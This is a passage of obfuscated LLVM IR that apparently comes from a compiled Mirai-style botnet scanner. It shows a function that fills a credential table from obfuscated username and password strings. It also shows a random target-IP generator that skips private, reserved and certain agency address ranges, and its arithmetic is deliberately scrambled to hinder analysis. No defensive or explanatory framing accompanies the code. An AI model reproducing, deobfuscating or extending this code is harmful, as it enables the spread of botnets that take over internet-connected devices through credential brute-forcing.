  br label %1090

; <label>:1090:                                   ; preds = %1089, %698, %654
  %1091 = load i32, i32* %1, align 4
  %1092 = sub i32 0, %1091
  %1093 = sub i32 0, 1
  %1094 = add i32 %1092, %1093
  %1095 = sub i32 0, %1094
  %1096 = add nsw i32 %1091, 1
  store i32 %1095, i32* %1, align 4
  br label %642

; <label>:1097:                                   ; preds = %642
  br label %197
}

declare i32 @util_local_addr() #3

declare void @rand_init() #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = sub i32 0, %10
  %12 = sub i32 0, 1
  %13 = add i32 %11, %12
  %14 = sub i32 0, %13
  %15 = add nsw i32 %10, 1
  %16 = sext i32 %14 to i64
  %17 = mul i64 %16, 24
  %18 = call i8* @realloc(i8* %9, i64 %17) #6
  %19 = bitcast i8* %18 to %struct.scanner_auth*
  store %struct.scanner_auth* %19, %struct.scanner_auth** @auth_table, align 8
  %20 = load i8*, i8** %4, align 8
  %21 = call i8* @deobf(i8* %20, i32* %7)
  %22 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %23 = load i32, i32* @auth_table_len, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %22, i64 %24
  %26 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %25, i32 0, i32 0
  store i8* %21, i8** %26, align 8
  %27 = load i32, i32* %7, align 4
  %28 = trunc i32 %27 to i8
  %29 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %30 = load i32, i32* @auth_table_len, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %29, i64 %31
  %33 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i32 0, i32 4
  store i8 %28, i8* %33, align 4
  %34 = load i8*, i8** %5, align 8
  %35 = call i8* @deobf(i8* %34, i32* %7)
  %36 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %37 = load i32, i32* @auth_table_len, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %36, i64 %38
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i32 0, i32 1
  store i8* %35, i8** %40, align 8
  %41 = load i32, i32* %7, align 4
  %42 = trunc i32 %41 to i8
  %43 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %44 = load i32, i32* @auth_table_len, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %43, i64 %45
  %47 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %46, i32 0, i32 5
  store i8 %42, i8* %47, align 1
  %48 = load i16, i16* @auth_table_max_weight, align 2
  %49 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %50 = load i32, i32* @auth_table_len, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %49, i64 %51
  %53 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %52, i32 0, i32 2
  store i16 %48, i16* %53, align 8
  %54 = load i16, i16* @auth_table_max_weight, align 2
  %55 = zext i16 %54 to i32
  %56 = load i16, i16* %6, align 2
  %57 = zext i16 %56 to i32
  %58 = sub i32 0, %55
  %59 = sub i32 0, %57
  %60 = add i32 %58, %59
  %61 = sub i32 0, %60
  %62 = add nsw i32 %55, %57
  %63 = trunc i32 %61 to i16
  %64 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %65 = load i32, i32* @auth_table_len, align 4
  %66 = sub i32 0, %65
  %67 = sub i32 0, 1
  %68 = add i32 %66, %67
  %69 = sub i32 0, %68
  %70 = add nsw i32 %65, 1
  store i32 %69, i32* @auth_table_len, align 4
  %71 = sext i32 %65 to i64
  %72 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %64, i64 %71
  %73 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %72, i32 0, i32 3
  store i16 %63, i16* %73, align 2
  %74 = load i16, i16* %6, align 2
  %75 = zext i16 %74 to i32
  %76 = load i16, i16* @auth_table_max_weight, align 2
  %77 = zext i16 %76 to i32
  %78 = sub i32 0, %75
  %79 = sub i32 %77, %78
  %80 = add nsw i32 %77, %75
  %81 = trunc i32 %79 to i16
  store i16 %81, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  br label %6

; <label>:6:                                      ; preds = %2343, %0
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = load i32, i32* %1, align 4
  %9 = xor i32 %8, -1
  %10 = xor i32 255, -1
  %11 = xor i32 110985712, -1
  %12 = or i32 %9, %10
  %13 = or i32 110985712, %11
  %14 = xor i32 %12, -1
  %15 = and i32 %14, %13
  %16 = and i32 %8, 255
  %17 = trunc i32 %15 to i8
  store i8 %17, i8* %2, align 1
  %18 = load i32, i32* %1, align 4
  %19 = lshr i32 %18, 8
  %20 = xor i32 %19, -1
  %21 = xor i32 255, -1
  %22 = xor i32 570490536, -1
  %23 = or i32 %20, %21
  %24 = or i32 570490536, %22
  %25 = xor i32 %23, -1
  %26 = and i32 %25, %24
  %27 = and i32 %19, 255
  %28 = trunc i32 %26 to i8
  store i8 %28, i8* %3, align 1
  %29 = load i32, i32* %1, align 4
  %30 = lshr i32 %29, 16
  %31 = xor i32 %30, -1
  %32 = xor i32 255, -1
  %33 = xor i32 1748279684, -1
  %34 = or i32 %31, %32
  %35 = or i32 1748279684, %33
  %36 = xor i32 %34, -1
  %37 = and i32 %36, %35
  %38 = and i32 %30, 255
  %39 = trunc i32 %37 to i8
  store i8 %39, i8* %4, align 1
  %40 = load i32, i32* %1, align 4
  %41 = lshr i32 %40, 24
  %42 = xor i32 %41, -1
  %43 = xor i32 255, -1
  %44 = xor i32 -1748602268, -1
  %45 = or i32 %42, %43
  %46 = or i32 -1748602268, %44
  %47 = xor i32 %45, -1
  %48 = and i32 %47, %46
  %49 = and i32 %41, 255
  %50 = trunc i32 %48 to i8
  store i8 %50, i8* %5, align 1
  br label %51

; <label>:51:                                     ; preds = %6
  %52 = load i8, i8* %2, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 127
  br i1 %54, label %2343, label %55

; <label>:55:                                     ; preds = %51
  %56 = load i8, i8* %2, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %2343, label %59

; <label>:59:                                     ; preds = %55
  %60 = load i8, i8* %2, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 3
  br i1 %62, label %2343, label %63

; <label>:63:                                     ; preds = %59
  %64 = load i8, i8* %2, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 15
  br i1 %66, label %2343, label %67

; <label>:67:                                     ; preds = %63
  %68 = load i8, i8* %2, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 56
  br i1 %70, label %2343, label %71

; <label>:71:                                     ; preds = %67
  %72 = load i8, i8* %2, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  br i1 %74, label %2343, label %75

; <label>:75:                                     ; preds = %71
  %76 = load i8, i8* %2, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp eq i32 %77, 25
  br i1 %78, label %2343, label %79

; <label>:79:                                     ; preds = %75
  %80 = load i8, i8* %2, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 49
  br i1 %82, label %2343, label %83

; <label>:83:                                     ; preds = %79
  %84 = load i8, i8* %2, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 50
  br i1 %86, label %2343, label %87

; <label>:87:                                     ; preds = %83
  %88 = load i8, i8* %2, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 137
  br i1 %90, label %2343, label %91

; <label>:91:                                     ; preds = %87
  %92 = load i8, i8* %2, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 6
  br i1 %94, label %2343, label %95

; <label>:95:                                     ; preds = %91
  %96 = load i8, i8* %2, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 7
  br i1 %98, label %2343, label %99

; <label>:99:                                     ; preds = %95
  %100 = load i8, i8* %2, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 11
  br i1 %102, label %2343, label %103

; <label>:103:                                    ; preds = %99
  %104 = load i8, i8* %2, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 21
  br i1 %106, label %2343, label %107

; <label>:107:                                    ; preds = %103
  %108 = load i8, i8* %2, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 22
  br i1 %110, label %2343, label %111

; <label>:111:                                    ; preds = %107
  %112 = load i8, i8* %2, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 26
  br i1 %114, label %2343, label %115

; <label>:115:                                    ; preds = %111
  %116 = load i8, i8* %2, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 28
  br i1 %118, label %2343, label %119

; <label>:119:                                    ; preds = %115
  %120 = load i8, i8* %2, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 29
  br i1 %122, label %2343, label %123

; <label>:123:                                    ; preds = %119
  %124 = load i8, i8* %2, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 30
  br i1 %126, label %2343, label %127

; <label>:127:                                    ; preds = %123
  %128 = load i8, i8* %2, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 33
  br i1 %130, label %2343, label %131

; <label>:131:                                    ; preds = %127
  %132 = load i8, i8* %2, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 55
  br i1 %134, label %2343, label %135

; <label>:135:                                    ; preds = %131
  %136 = load i8, i8* %2, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 214
  br i1 %138, label %2343, label %139

; <label>:139:                                    ; preds = %135
  %140 = load i8, i8* %2, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 215
  br i1 %142, label %2343, label %143

; <label>:143:                                    ; preds = %139
  %144 = load i8, i8* %2, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 192
  br i1 %146, label %147, label %151

; <label>:147:                                    ; preds = %143
  %148 = load i8, i8* %3, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 168
  br i1 %150, label %2343, label %151

; <label>:151:                                    ; preds = %147, %143
  %152 = load i8, i8* %2, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 146
  br i1 %154, label %155, label %159

; <label>:155:                                    ; preds = %151
  %156 = load i8, i8* %3, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 17
  br i1 %158, label %2343, label %159

; <label>:159:                                    ; preds = %155, %151
  %160 = load i8, i8* %2, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 146
  br i1 %162, label %163, label %167

; <label>:163:                                    ; preds = %159
  %164 = load i8, i8* %3, align 1
  %165 = zext i8 %164 to i32
  %166 = icmp eq i32 %165, 80
  br i1 %166, label %2343, label %167

; <label>:167:                                    ; preds = %163, %159
  %168 = load i8, i8* %2, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 146
  br i1 %170, label %171, label %175

; <label>:171:                                    ; preds = %167
  %172 = load i8, i8* %3, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 98
  br i1 %174, label %2343, label %175

; <label>:175:                                    ; preds = %171, %167
  %176 = load i8, i8* %2, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp eq i32 %177, 146
  br i1 %178, label %179, label %183

; <label>:179:                                    ; preds = %175
  %180 = load i8, i8* %3, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 154
  br i1 %182, label %2343, label %183

; <label>:183:                                    ; preds = %179, %175
  %184 = load i8, i8* %2, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 147
  br i1 %186, label %187, label %191

; <label>:187:                                    ; preds = %183
  %188 = load i8, i8* %3, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 159
  br i1 %190, label %2343, label %191

; <label>:191:                                    ; preds = %187, %183
  %192 = load i8, i8* %2, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp eq i32 %193, 148
  br i1 %194, label %195, label %199

; <label>:195:                                    ; preds = %191
  %196 = load i8, i8* %3, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp eq i32 %197, 114
  br i1 %198, label %2343, label %199

; <label>:199:                                    ; preds = %195, %191
  %200 = load i8, i8* %2, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 150
  br i1 %202, label %203, label %207

; <label>:203:                                    ; preds = %199
  %204 = load i8, i8* %3, align 1
  %205 = zext i8 %204 to i32
  %206 = icmp eq i32 %205, 125
  br i1 %206, label %2343, label %207

; <label>:207:                                    ; preds = %203, %199
  %208 = load i8, i8* %2, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp eq i32 %209, 150
  br i1 %210, label %211, label %215

; <label>:211:                                    ; preds = %207
  %212 = load i8, i8* %3, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 133
  br i1 %214, label %2343, label %215

; <label>:215:                                    ; preds = %211, %207
  %216 = load i8, i8* %2, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp eq i32 %217, 150
  br i1 %218, label %219, label %223

; <label>:219:                                    ; preds = %215
  %220 = load i8, i8* %3, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 144
  br i1 %222, label %2343, label %223

; <label>:223:                                    ; preds = %219, %215
  %224 = load i8, i8* %2, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 150
  br i1 %226, label %227, label %231

; <label>:227:                                    ; preds = %223
  %228 = load i8, i8* %3, align 1
  %229 = zext i8 %228 to i32
  %230 = icmp eq i32 %229, 149
  br i1 %230, label %2343, label %231

; <label>:231:                                    ; preds = %227, %223
  %232 = load i8, i8* %2, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 150
  br i1 %234, label %235, label %239

; <label>:235:                                    ; preds = %231
  %236 = load i8, i8* %3, align 1
  %237 = zext i8 %236 to i32
  %238 = icmp eq i32 %237, 157
  br i1 %238, label %2343, label %239

; <label>:239:                                    ; preds = %235, %231
  %240 = load i8, i8* %2, align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 150
  br i1 %242, label %243, label %247

; <label>:243:                                    ; preds = %239
  %244 = load i8, i8* %3, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 184
  br i1 %246, label %2343, label %247

; <label>:247:                                    ; preds = %243, %239
  %248 = load i8, i8* %2, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp eq i32 %249, 150
  br i1 %250, label %251, label %255

; <label>:251:                                    ; preds = %247
  %252 = load i8, i8* %3, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp eq i32 %253, 190
  br i1 %254, label %2343, label %255

; <label>:255:                                    ; preds = %251, %247
  %256 = load i8, i8* %2, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp eq i32 %257, 150
  br i1 %258, label %259, label %263

; <label>:259:                                    ; preds = %255
  %260 = load i8, i8* %3, align 1
  %261 = zext i8 %260 to i32
  %262 = icmp eq i32 %261, 196
  br i1 %262, label %2343, label %263

; <label>:263:                                    ; preds = %259, %255
  %264 = load i8, i8* %2, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp eq i32 %265, 152
  br i1 %266, label %267, label %271

; <label>:267:                                    ; preds = %263
  %268 = load i8, i8* %3, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp eq i32 %269, 82
  br i1 %270, label %2343, label %271

; <label>:271:                                    ; preds = %267, %263
  %272 = load i8, i8* %2, align 1
  %273 = zext i8 %272 to i32
  %274 = icmp eq i32 %273, 152
  br i1 %274, label %275, label %279

; <label>:275:                                    ; preds = %271
  %276 = load i8, i8* %3, align 1
  %277 = zext i8 %276 to i32
  %278 = icmp eq i32 %277, 229
  br i1 %278, label %2343, label %279

; <label>:279:                                    ; preds = %275, %271
  %280 = load i8, i8* %2, align 1
  %281 = zext i8 %280 to i32
  %282 = icmp eq i32 %281, 157
  br i1 %282, label %283, label %287

; <label>:283:                                    ; preds = %279
  %284 = load i8, i8* %3, align 1
  %285 = zext i8 %284 to i32
  %286 = icmp eq i32 %285, 202
  br i1 %286, label %2343, label %287

; <label>:287:                                    ; preds = %283, %279
  %288 = load i8, i8* %2, align 1
  %289 = zext i8 %288 to i32
  %290 = icmp eq i32 %289, 157
  br i1 %290, label %291, label %295

; <label>:291:                                    ; preds = %287
  %292 = load i8, i8* %3, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp eq i32 %293, 217
  br i1 %294, label %2343, label %295

; <label>:295:                                    ; preds = %291, %287
  %296 = load i8, i8* %2, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp eq i32 %297, 161
  br i1 %298, label %299, label %303

; <label>:299:                                    ; preds = %295
  %300 = load i8, i8* %3, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp eq i32 %301, 124
  br i1 %302, label %2343, label %303

; <label>:303:                                    ; preds = %299, %295
  %304 = load i8, i8* %2, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp eq i32 %305, 162
  br i1 %306, label %307, label %311

; <label>:307:                                    ; preds = %303
  %308 = load i8, i8* %3, align 1
  %309 = zext i8 %308 to i32
  %310 = icmp eq i32 %309, 32
  br i1 %310, label %2343, label %311

; <label>:311:                                    ; preds = %307, %303
  %312 = load i8, i8* %2, align 1
  %313 = zext i8 %312 to i32
  %314 = icmp eq i32 %313, 155
  br i1 %314, label %315, label %319

; <label>:315:                                    ; preds = %311
  %316 = load i8, i8* %3, align 1
  %317 = zext i8 %316 to i32
  %318 = icmp eq i32 %317, 96
  br i1 %318, label %2343, label %319

; <label>:319:                                    ; preds = %315, %311
  %320 = load i8, i8* %2, align 1
  %321 = zext i8 %320 to i32
  %322 = icmp eq i32 %321, 155
  br i1 %322, label %323, label %327

; <label>:323:                                    ; preds = %319
  %324 = load i8, i8* %3, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp eq i32 %325, 149
  br i1 %326, label %2343, label %327

; <label>:327:                                    ; preds = %323, %319
  %328 = load i8, i8* %2, align 1
  %329 = zext i8 %328 to i32
  %330 = icmp eq i32 %329, 155
  br i1 %330, label %331, label %335

; <label>:331:                                    ; preds = %327
  %332 = load i8, i8* %3, align 1
  %333 = zext i8 %332 to i32
  %334 = icmp eq i32 %333, 155
  br i1 %334, label %2343, label %335

; <label>:335:                                    ; preds = %331, %327
  %336 = load i8, i8* %2, align 1
  %337 = zext i8 %336 to i32
  %338 = icmp eq i32 %337, 155
  br i1 %338, label %339, label %343

; <label>:339:                                    ; preds = %335
  %340 = load i8, i8* %3, align 1
  %341 = zext i8 %340 to i32
  %342 = icmp eq i32 %341, 178
  br i1 %342, label %2343, label %343

; <label>:343:                                    ; preds = %339, %335
  %344 = load i8, i8* %2, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp eq i32 %345, 164
  br i1 %346, label %347, label %351

; <label>:347:                                    ; preds = %343
  %348 = load i8, i8* %3, align 1
  %349 = zext i8 %348 to i32
  %350 = icmp eq i32 %349, 158
  br i1 %350, label %2343, label %351

; <label>:351:                                    ; preds = %347, %343
  %352 = load i8, i8* %2, align 1
  %353 = zext i8 %352 to i32
  %354 = icmp eq i32 %353, 156
  br i1 %354, label %355, label %359

; <label>:355:                                    ; preds = %351
  %356 = load i8, i8* %3, align 1
  %357 = zext i8 %356 to i32
  %358 = icmp eq i32 %357, 9
  br i1 %358, label %2343, label %359

; <label>:359:                                    ; preds = %355, %351
  %360 = load i8, i8* %2, align 1
  %361 = zext i8 %360 to i32
  %362 = icmp eq i32 %361, 167
  br i1 %362, label %363, label %367

; <label>:363:                                    ; preds = %359
  %364 = load i8, i8* %3, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp eq i32 %365, 44
  br i1 %366, label %2343, label %367

; <label>:367:                                    ; preds = %363, %359
  %368 = load i8, i8* %2, align 1
  %369 = zext i8 %368 to i32
  %370 = icmp eq i32 %369, 168
  br i1 %370, label %371, label %375

; <label>:371:                                    ; preds = %367
  %372 = load i8, i8* %3, align 1
  %373 = zext i8 %372 to i32
  %374 = icmp eq i32 %373, 68
  br i1 %374, label %2343, label %375

; <label>:375:                                    ; preds = %371, %367
  %376 = load i8, i8* %2, align 1
  %377 = zext i8 %376 to i32
  %378 = icmp eq i32 %377, 168
  br i1 %378, label %379, label %383

; <label>:379:                                    ; preds = %375
  %380 = load i8, i8* %3, align 1
  %381 = zext i8 %380 to i32
  %382 = icmp eq i32 %381, 85
  br i1 %382, label %2343, label %383

; <label>:383:                                    ; preds = %379, %375
  %384 = load i8, i8* %2, align 1
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 168
  br i1 %386, label %387, label %391

; <label>:387:                                    ; preds = %383
  %388 = load i8, i8* %3, align 1
  %389 = zext i8 %388 to i32
  %390 = icmp eq i32 %389, 102
  br i1 %390, label %2343, label %391

; <label>:391:                                    ; preds = %387, %383
  %392 = load i8, i8* %2, align 1
  %393 = zext i8 %392 to i32
  %394 = icmp eq i32 %393, 203
  br i1 %394, label %395, label %399

; <label>:395:                                    ; preds = %391
  %396 = load i8, i8* %3, align 1
  %397 = zext i8 %396 to i32
  %398 = icmp eq i32 %397, 59
  br i1 %398, label %2343, label %399

; <label>:399:                                    ; preds = %395, %391
  %400 = load i8, i8* %2, align 1
  %401 = zext i8 %400 to i32
  %402 = icmp eq i32 %401, 204
  br i1 %402, label %403, label %407

; <label>:403:                                    ; preds = %399
  %404 = load i8, i8* %3, align 1
  %405 = zext i8 %404 to i32
  %406 = icmp eq i32 %405, 34
  br i1 %406, label %2343, label %407

; <label>:407:                                    ; preds = %403, %399
  %408 = load i8, i8* %2, align 1
  %409 = zext i8 %408 to i32
  %410 = icmp eq i32 %409, 207
  br i1 %410, label %411, label %415

; <label>:411:                                    ; preds = %407
  %412 = load i8, i8* %3, align 1
  %413 = zext i8 %412 to i32
  %414 = icmp eq i32 %413, 30
  br i1 %414, label %2343, label %415

; <label>:415:                                    ; preds = %411, %407
  %416 = load i8, i8* %2, align 1
  %417 = zext i8 %416 to i32
  %418 = icmp eq i32 %417, 117
  br i1 %418, label %419, label %423

; <label>:419:                                    ; preds = %415
  %420 = load i8, i8* %3, align 1
  %421 = zext i8 %420 to i32
  %422 = icmp eq i32 %421, 55
  br i1 %422, label %2343, label %423

; <label>:423:                                    ; preds = %419, %415
  %424 = load i8, i8* %2, align 1
  %425 = zext i8 %424 to i32
  %426 = icmp eq i32 %425, 117
  br i1 %426, label %427, label %431

; <label>:427:                                    ; preds = %423
  %428 = load i8, i8* %3, align 1
  %429 = zext i8 %428 to i32
  %430 = icmp eq i32 %429, 56
  br i1 %430, label %2343, label %431

; <label>:431:                                    ; preds = %427, %423
  %432 = load i8, i8* %2, align 1
  %433 = zext i8 %432 to i32
  %434 = icmp eq i32 %433, 80
  br i1 %434, label %435, label %439

; <label>:435:                                    ; preds = %431
  %436 = load i8, i8* %3, align 1
  %437 = zext i8 %436 to i32
  %438 = icmp eq i32 %437, 235
  br i1 %438, label %2343, label %439

; <label>:439:                                    ; preds = %435, %431
  %440 = load i8, i8* %2, align 1
  %441 = zext i8 %440 to i32
  %442 = icmp eq i32 %441, 207
  br i1 %442, label %443, label %447

; <label>:443:                                    ; preds = %439
  %444 = load i8, i8* %3, align 1
  %445 = zext i8 %444 to i32
  %446 = icmp eq i32 %445, 120
  br i1 %446, label %2343, label %447

; <label>:447:                                    ; preds = %443, %439
  %448 = load i8, i8* %2, align 1
  %449 = zext i8 %448 to i32
  %450 = icmp eq i32 %449, 209
  br i1 %450, label %451, label %455

; <label>:451:                                    ; preds = %447
  %452 = load i8, i8* %3, align 1
  %453 = zext i8 %452 to i32
  %454 = icmp eq i32 %453, 35
  br i1 %454, label %2343, label %455

; <label>:455:                                    ; preds = %451, %447
  %456 = load i8, i8* %2, align 1
  %457 = zext i8 %456 to i32
  %458 = icmp eq i32 %457, 64
  br i1 %458, label %459, label %463

; <label>:459:                                    ; preds = %455
  %460 = load i8, i8* %3, align 1
  %461 = zext i8 %460 to i32
  %462 = icmp eq i32 %461, 70
  br i1 %462, label %2343, label %463

; <label>:463:                                    ; preds = %459, %455
  %464 = load i8, i8* %2, align 1
  %465 = zext i8 %464 to i32
  %466 = icmp eq i32 %465, 172
  br i1 %466, label %467, label %475

; <label>:467:                                    ; preds = %463
  %468 = load i8, i8* %3, align 1
  %469 = zext i8 %468 to i32
  %470 = icmp sge i32 %469, 16
  br i1 %470, label %471, label %475

; <label>:471:                                    ; preds = %467
  %472 = load i8, i8* %3, align 1
  %473 = zext i8 %472 to i32
  %474 = icmp slt i32 %473, 32
  br i1 %474, label %2343, label %475

; <label>:475:                                    ; preds = %471, %467, %463
  %476 = load i8, i8* %2, align 1
  %477 = zext i8 %476 to i32
  %478 = icmp eq i32 %477, 100
  br i1 %478, label %479, label %487

; <label>:479:                                    ; preds = %475
  %480 = load i8, i8* %3, align 1
  %481 = zext i8 %480 to i32
  %482 = icmp sge i32 %481, 64
  br i1 %482, label %483, label %487

; <label>:483:                                    ; preds = %479
  %484 = load i8, i8* %3, align 1
  %485 = zext i8 %484 to i32
  %486 = icmp slt i32 %485, 127
  br i1 %486, label %2343, label %487

; <label>:487:                                    ; preds = %483, %479, %475
  %488 = load i8, i8* %2, align 1
  %489 = zext i8 %488 to i32
  %490 = icmp eq i32 %489, 169
  br i1 %490, label %491, label %495

; <label>:491:                                    ; preds = %487
  %492 = load i8, i8* %3, align 1
  %493 = zext i8 %492 to i32
  %494 = icmp eq i32 %493, 254
  br i1 %494, label %2343, label %495

; <label>:495:                                    ; preds = %491, %487
  %496 = load i8, i8* %2, align 1
  %497 = zext i8 %496 to i32
  %498 = icmp eq i32 %497, 198
  br i1 %498, label %499, label %507

; <label>:499:                                    ; preds = %495
  %500 = load i8, i8* %3, align 1
  %501 = zext i8 %500 to i32
  %502 = icmp sge i32 %501, 18
  br i1 %502, label %503, label %507

; <label>:503:                                    ; preds = %499
  %504 = load i8, i8* %3, align 1
  %505 = zext i8 %504 to i32
  %506 = icmp slt i32 %505, 20
  br i1 %506, label %2343, label %507

; <label>:507:                                    ; preds = %503, %499, %495
  %508 = load i8, i8* %2, align 1
  %509 = zext i8 %508 to i32
  %510 = icmp eq i32 %509, 64
  br i1 %510, label %511, label %519

; <label>:511:                                    ; preds = %507
  %512 = load i8, i8* %3, align 1
  %513 = zext i8 %512 to i32
  %514 = icmp sge i32 %513, 69
  br i1 %514, label %515, label %519

; <label>:515:                                    ; preds = %511
  %516 = load i8, i8* %3, align 1
  %517 = zext i8 %516 to i32
  %518 = icmp slt i32 %517, 227
  br i1 %518, label %2343, label %519

; <label>:519:                                    ; preds = %515, %511, %507
  %520 = load i8, i8* %2, align 1
  %521 = zext i8 %520 to i32
  %522 = icmp eq i32 %521, 128
  br i1 %522, label %523, label %531

; <label>:523:                                    ; preds = %519
  %524 = load i8, i8* %3, align 1
  %525 = zext i8 %524 to i32
  %526 = icmp sge i32 %525, 35
  br i1 %526, label %527, label %531

; <label>:527:                                    ; preds = %523
  %528 = load i8, i8* %3, align 1
  %529 = zext i8 %528 to i32
  %530 = icmp slt i32 %529, 237
  br i1 %530, label %2343, label %531

; <label>:531:                                    ; preds = %527, %523, %519
  %532 = load i8, i8* %2, align 1
  %533 = zext i8 %532 to i32
  %534 = icmp eq i32 %533, 129
  br i1 %534, label %535, label %543

; <label>:535:                                    ; preds = %531
  %536 = load i8, i8* %3, align 1
  %537 = zext i8 %536 to i32
  %538 = icmp sge i32 %537, 22
  br i1 %538, label %539, label %543

; <label>:539:                                    ; preds = %535
  %540 = load i8, i8* %3, align 1
  %541 = zext i8 %540 to i32
  %542 = icmp slt i32 %541, 255
  br i1 %542, label %2343, label %543

; <label>:543:                                    ; preds = %539, %535, %531
  %544 = load i8, i8* %2, align 1
  %545 = zext i8 %544 to i32
  %546 = icmp eq i32 %545, 130
  br i1 %546, label %547, label %555

; <label>:547:                                    ; preds = %543
  %548 = load i8, i8* %3, align 1
  %549 = zext i8 %548 to i32
  %550 = icmp sge i32 %549, 40
  br i1 %550, label %551, label %555

; <label>:551:                                    ; preds = %547
  %552 = load i8, i8* %3, align 1
  %553 = zext i8 %552 to i32
  %554 = icmp slt i32 %553, 168
  br i1 %554, label %2343, label %555

; <label>:555:                                    ; preds = %551, %547, %543
  %556 = load i8, i8* %2, align 1
  %557 = zext i8 %556 to i32
